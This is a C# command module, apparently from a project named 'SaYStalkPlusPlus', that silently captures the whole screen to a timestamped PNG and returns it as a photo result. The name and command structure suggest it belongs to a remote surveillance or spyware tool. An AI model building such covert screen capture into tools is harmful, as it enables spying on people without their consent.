using System.Drawing.Imaging;

namespace SaYStalkPlusPlus.src.Commands
{
    class TakeScreen : ICommand
    {
        static public CommandResult Execute(string?[] args)
        {
            string directoryPath = "imgs";
            string filePath = Path.Combine(directoryPath, DateTime.Now.ToString("u").Replace(':', '-') + ".png");

            try
            {
                if (!Directory.Exists(directoryPath)) Directory.CreateDirectory(directoryPath);

                Rectangle bounds = Screen.GetBounds(Point.Empty);
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    bitmap.Save(filePath, ImageFormat.Png);
                }
            }
            catch (Exception ex)
            {
                return new CommandResult(false, null, $"Error while capturing a screen: {ex.Message}");
            }
            return new CommandResult(true, filePath, null, CommandResultType.Photo);
        }

    }
}
